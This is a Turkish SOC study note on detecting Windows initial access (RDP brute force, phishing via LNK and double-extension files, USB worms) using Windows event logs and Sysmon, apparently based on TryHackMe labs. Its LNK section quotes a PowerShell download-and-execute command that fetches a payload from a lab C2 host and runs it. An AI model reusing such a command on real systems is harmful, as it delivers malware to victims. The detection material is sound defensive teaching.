# 🚪 Windows Threat Detection 1 —  İlk Erişim (Initial Access) Tehdit Avcılığı Notu

**Etiketler:** `#SOC` `#InitialAccess` `#RDP` `#Phishing` `#LNK` `#USBForensics` `#Sysmon` `#WindowsEventLogs` `#T1133` `#T1190` `#T1566` `#T1091` `#TryHackMe`

## 🏛️ 1. Mimari Yapı ve İlk Erişim (Initial Access) Mekanizması

Siber saldırı yaşam döngüsünde (Cyber Kill Chain / MITRE ATT&CK), bir tehdit aktörünün hedef ağa adım attığı ilk ana **İlk Erişim (Initial Access)** denir. Savunma mimarisinde bu vektörler iki temel kategoriye ayrılır:

  

```
                                [ 🎯 HEDEF WINDOWS ALTYAPISI ]
                                              │
         ┌────────────────────────────────────┴────────────────────────────────────┐
         ▼                                                                         ▼
[ 🌐 AÇIK SERVİSLER (Exposed Services) ]                 [ 👤 KULLANICI TETİKLEMELİ (User-Driven) ]
• Doğrudan internete açık portlar                       • Güvenlik duvarını içeriden delen insan faktörü
• Botnet ve otomatik tarayıcılar (24/7)                  • Sosyal mühendislik ve içerik manipülasyonu
• T1133 (Dış Uzak Servisler: RDP, SSH, VNC)              • T1566 (Phishing: Zararlı ekler, LNK, Sahte uzantılar)
• T1190 (Açık Uygulama İstismarı: Web, Mail/Exchange)    • T1091 (Çıkarılabilir Medya: Enfekte USB bellekler)
```

### 🔹 Vektörlerin Karşılaştırmalı Analiz Matrisi

|**Erişim Vektörü**|**MITRE ATT&CK Kodu**|**İstismar Yöntemi**|**Birincil Tespit Kaynağı**|
|---|---|---|---|
|**Açık Uzak Servisler**|**T1133** (_External Remote Services_)|İnternete bakan RDP (3389), SSH, VNC servislerine yönelik kaba kuvvet veya sızdırılmış kimlik bilgisi saldırıları.|Windows `Security.evtx` (Olay ID: `4625`, `4624`).|
|**İnternete Açık Uygulama**|**T1190** (_Exploit Public-Facing App_)|Kurumsal web uygulamaları, VPN gateway veya posta sunucularındaki (MS Exchange vb.) yamalanmamış açıkların istismarı.|Web Access Logları, IIS logları, WAF alarmları.|
|**Oltalama (Phishing)**|**T1566** (_Phishing_)|Çift uzantılı (.pdf.exe), gizli komut barındıran (.lnk) veya çalıştırılabilir (.com, .scr) eklerin kullanıcıya açtırılması.|Sysmon (`Event ID 1, 11, 22`), EDR telemetrisi.|
|**Çıkarılabilir Medya**|**T1091** (_Replication Through Removable Media_)|Fiziksel olarak takılan enfekte USB'ler ile izole (air-gapped) ağların aşılması veya solucan (worm) yayılımı.|Sysmon (`Event ID 1, 11`), Registry (USBSTOR).|

> [!NOTE]
> 
> **Sektörel Rapor Notu (M-Trends & HoxHunt):** RDP saldırıları günümüzde fidye yazılımı ekipleri (Medusa, Akira) tarafından o kadar yoğun kullanılmaktadır ki savunucular RDP'yi _"Ransomware Deployment Protocol"_ olarak adlandırır. Oltalama tarafında ise üretken yapay zekanın devreye girmesiyle birlikte oltalama saldırı hacmi son yıllarda onlarca kat artış göstermiştir.
> 
>   

## 🔐 2. Vaka 1: İnternete Açık RDP İstismarı ve Adli Tespiti

Bir IT yöneticisinin hafta sonu evden çalışmak için üretim sunucusundaki 3389 portunu doğrudan dış dünyaya açması ve zayıf parola (`Summer2025`) belirlemesi senaryosu:

  

```
[ SALDIRI ADIMLARI ]
1. Dış Port Taraması (Botnet) ──► Hedef IP üzerinde 3389 RDP açık bulundu.
2. Parola Kaba Kuvveti        ──► Event ID 4625 (Administrator için yüzlerce başarısız giriş).
3. İlk Erişim Başarısı        ──► Event ID 4624 (Logon Type 10 / Başarılı RDP Girişi).
4. Oturum Takibi & Keşif      ──► Sysmon Event ID 1 (Aynı Logon ID ile başlatılan şüpheli süreçler).
```

### 🔹 Adli İnceleme Süreci (`RDP-Security.evtx`)

1. **Brute-Force Belirteçleri:**
    
      
    - `Security.evtx` açılır ve `Event ID: 4625` filtrelenir.
        
          
        
    - Hedef kullanıcı alanında yoğun şekilde `Administrator` hesabının hedeflendiği görülür.
        
          
        
2. **Başarılı Sızmanın Doğrulanması:**
    
      
    - Filtre `Event ID: 4624` ve `Logon Type: 10` (RemoteInteractive) olarak değiştirilir.
        
          
        
    - Başarılı giriş yapan dış IP adresi tespit edilir: **`203.205.34.107`**.
        
          
        
3. **Gerçek Host Adının (Workstation Name) Avlanması:**
    
      
    - `4624` olayındaki `Workstation Name` bazen hedef makinenin kendi adını yansıtabilir.
        
          
        
    - **Analist Pivotu:** Başarılı `4624` olayındaki benzersiz **`Logon ID`** kopyalanır (`0x...`). Sysmon loglarında bu `Logon ID` ile başlatılan ilk `Event ID 1` süreçleri ve oturum detayları filtrelenerek saldırganın gerçek makine adı saptanır: **`DESKTOP-QNBC4UU`**.
        
          
        

## 🎣 3. Vaka 2: Oltalama (Phishing) Teknikleri ve Dosya Manipülasyonları

Saldırganlar kurumsal savunmaları atlatmak için işletim sisteminin görsel zaaflarından faydalanırlar.

  

### 🔹 Analiz Edilen Oltalama Teknikleri

|**Oltalama Yöntemi**|**Çalışma Mekanizması**|**Örnek / Dosya Yapısı**|
|---|---|---|
|**Aldatıcı Uzantı (.COM)**|Windows'ta `.com` uzantısı bir web adresi değil, DOS/Windows tabanlı çalıştırılabilir ikili (binary) bir dosyadır.|`www.skype.com` (Görünüşte web linki, gerçekte çalıştırılabilir zararlı dosya).|
|**Kısayol (LNK) İstismarı**|LNK dosyasının simgesi PDF veya klasör yapılır; "Target" alanına gizli PowerShell indirme komutu gömülür.|`Visit Our Website!.lnk` $\rightarrow$ Arka planda PowerShell çalıştırır.|
|**Çift Uzantı Tuzağı**|Windows varsayılan olarak "bilinen dosya uzantılarını gizler". Dosya adı `dosya.pdf.exe` ise kullanıcı bunu sadece `dosya.pdf` olarak görür.|`best-cat.jpg.exe` (Kullanıcı resim açtığını sanır, sistem PE çalıştırır).|

### 🔹 LNK Dosyası İçine Gömülen PowerShell İndirme Satırı

Laboratuvar senaryosunda LNK özelliklerinden çıkarılan canlı istismar komutu:

  

PowerShell

```
powershell.exe -c (New-Object System.Net.WebClient).DownloadFile('http://wp16.hqywlqpa.thm:8000/cgi-bin/f','C:\\ProgramData\\r.exe'); start C:\\ProgramData\\r.exe;
```

- `powershell.exe -c`: PowerShell konsolunu açıp ardından gelen komut dizesini (`-Command`) çalıştırır.
    
      
    
- `(New-Object System.Net.WebClient)`: .NET kütüphanesinden dosya indirme kabiliyeti olan bir WebClient nesnesi türetir.
    
      
    
- `.DownloadFile(...)`:
    
      
    - `'http://wp16.hqywlqpa.thm:8000/cgi-bin/f'`: İkinci aşama zararlısının (RemcosRAT vb.) çekildiği C2 URL adresi.
        
          
        
    - `'C:\\ProgramData\\r.exe'`: İndirilen zararlının diske yazılacağı gizli sistem konumu.
        
          
        
- `start C:\\ProgramData\\r.exe;`: İndirme tamamlandıktan sonra zararlı ikiliyi arka planda bağımsız bir süreç olarak başlatır.
    
      
    

> [!WARNING]
> 
> **LNK Dosyalarının Adli Kör Noktası:**
> 
> Bir kullanıcı `.lnk` kısayolunu çift tıkladığında, Windows Gezgini (`explorer.exe`) kısayolun içindeki hedefi okur ve doğrudan çalıştırır. Loglarda `explorer.exe` sanki doğrudan `powershell.exe` başlatmış gibi görünür; LNK dosyasının adı süreç argümanında yer almayabilir. Bu durumda analist, Sysmon **Event ID 11** (Dosya Oluşturma) loglarına giderek kullanıcının İndirilenler (`Downloads`) klasörüne düşen `.lnk` dosyasını bulmalıdır.
> 
>   

## 🔬 4. Vaka 3: Sysmon ile Uçtan Uca Zararlı İndirme Analizi (`Phishing-Sysmon.evtx`)

Bir arşiv dosyası (.zip) içinde gizlenen çift uzantılı zararlının sistemdeki yaşam döngüsü 4 adımlı Sysmon zinciriyle takip edilmiştir:

  

```
[ SYSMON TEHDİT ZİNCİRİ ]
1. Tarayıcı İndirmesi ──► Event ID 11 (msedge.exe -> top-cats.zip indirildi)
2. Arşivden Çıkarma   ──► Event ID 11 (explorer.exe -> C:\Users\Administrator\Pictures dizinine çıkarıldı)
3. Çift Tıklama/İcra  ──► Event ID 1  (PID: 5484 -> best-cat.jpg.exe çalıştırıldı)
4. Dış C2 Bağlantısı  ──► Event ID 22 (PID 5484 -> rjj.store alan adına DNS sorgusu atıldı)
```

### 🔹 Laboratuvar Adli Sorgu Aşamaları:

1. **İndirilen Dosya (Event ID 11):** `Image` değeri `msedge.exe` olan loglar süzülür. Hedef dosyanın `C:\Users\Administrator\Downloads\top-cats.zip` olduğu saptanır. (_Not: Dosya sonundaki `:Zone.Identifier`, dosyanın internetten indiğini belgeleyen Mark of the Web / ADS etiketidir_).
    
      
    
2. **Arşivin Açıldığı Dizin (Event ID 11):** İndirme sonrasında `TargetFilename` yolu izlendiğinde, dosyaların `C:\Users\Administrator\Pictures` klasörüne ayıklandığı görülür.
    
      
    
3. **Zararlı Süreç Kimliği (Event ID 1):** Ayıklanan klasör yolundaki dosya icrası aratılır; `best-cat.jpg.exe` dosyasını başlatan sürecin PID değeri **`5484`** olarak tespit edilir.
    
      
    
4. **C2 İletişimi (Event ID 22):** `ProcessId: 5484` değeriyle DNS sorguları (`Event ID 22`) filtrelenir; zararlının iletişim kurduğu C2 alan adının **`rjj.store`** olduğu doğrulanır.
    
      
    

## 💾 5. Vaka 4: Çıkarılabilir Medya (USB / Worm) Yayılımı (`USB-Sysmon.evtx`)

USB tabanlı saldırılar (Raspberry Robin, Camaro Dragon) ağ güvenlik duvarlarını fiziksel olarak atlar ve internete bağlı olmayan (Air-Gapped) sistemleri bile enfekte edebilir.

  

```
[ USB SALDIRI & YAYILMA MEKANİZMASI ]
Kullanıcı USB Taktı (E:) ──► Gizlenmiş Sahte İkiliye Tıkladı (E:\Open Sandisk 4GB USB.exe)
                                           │
                                           ▼ (Sysmon Event ID 11)
            Kalıcılık İçin Diske Dropper Bırakıldı (C:\Users\Public\Documents\winupdate.exe)
                                           │
                                           ▼ (Solucan / Worm Yayılımı - Sysmon Event ID 11)
               Sisteme Takılan İkinci Harici Sürücüye Bulaştı (F: Sürücüsü)
```

### 🔹 Adli Bulgular:

- **Tıklanan USB Dosyası:** Kullanıcı, `E:\` sürücüsü içerisinde klasör veya meşru yazılım gibi kamufle edilmiş olan **`E:\Open Sandisk 4GB USB.exe`** dosyasını çalıştırmıştır (Sysmon Event ID 1).
    
      
    
- **Diske Bırakılan Kalıcı Yük (Dropped File):** Zararlı çalıştıktan sonra `C:\Users\Public\Documents\winupdate.exe` dosyasını diske bırakmıştır (Sysmon Event ID 11).
    
      
    
- **Yanal Yayılım (Propagation):** Zararlı süreç arka planda sistemdeki diğer çıkarılabilir sürücüleri taramış ve takılı olan **`F:`** sürücüsüne kendini kopyalamıştır.

## 🚦 7. Tekrar Kategorisi & 3 Dakikalık Pazar Tekrar Stratejisi

### 🔴 Kırmızı Sınıf: İlk Erişim İmzaları, Sysmon Olay Zincirleri & MITRE Kodları

Bu modül **Kırmızı Sınıf** (Doğrudan Tehdit Göstergeleri, Sysmon ID Zincirleri ve Analist Pivot Refleksleri) kategorisindedir.

  

### ⏱️ Pazar Günü 3 Dakikalık Hızlı Tekrar Rutini

1. **RDP İstismar Zincirini Zihninde Canlandır (1. Dakika):**
    
      
    - Yüzlerce `4625` (Logon Type 3/10) $\rightarrow$ Tekil `4624` (Logon Type 10).
        
          
        
    - Kaynak IP'yi `4624`'ten al; gerçek hostname için **`Logon ID`** değerini Sysmon Event ID 1 ile eşleştir.
        
          
        
2. **Sysmon Enfeksiyon Takip Zincirini Sırala (2. Dakika):**
    
      
    - _Dosya İndi:_ `Event ID 11` (`msedge.exe` $\rightarrow$ Downloads / Zone.Identifier).
        
          
        
    - _Dosya Açıldı/Çalıştı:_ `Event ID 1` (`ProcessId` belirlenir).
        
          
        
    - _C2 Bağlantısı:_ `Event ID 22` (Aynı `ProcessId` ile tetiklenen DNS sorgusu).
        
          
        
3. **Mülakat Sorusu Canlandırması (3. Dakika):**
    
      
    - _Soru:_ "Bir kullanıcının çift uzantılı bir PDF (`fatura.pdf.exe`) veya LNK dosyası üzerinden enfekte olduğunu loglardan nasıl kanıtlarsın?"
        
          
        
    - _Cevap:_ "LNK ve çift uzantılarda Windows Explorer süreci maskeleyebilir. İlk olarak Sysmon Event ID 11 ile İndirilenler klasörüne düşen arşiv veya LNK dosyasını tespit ederim. Ardından `explorer.exe` tarafından tetiklenen anormal çocuk süreçleri (PowerShell veya gizli uzantılı binary) Sysmon Event ID 1 üzerinden yakalar; elde ettiğim PID üzerinden Event ID 22 (DNS) ve Event ID 3 (Network) ile dış C2 iletişimini belgelerim."
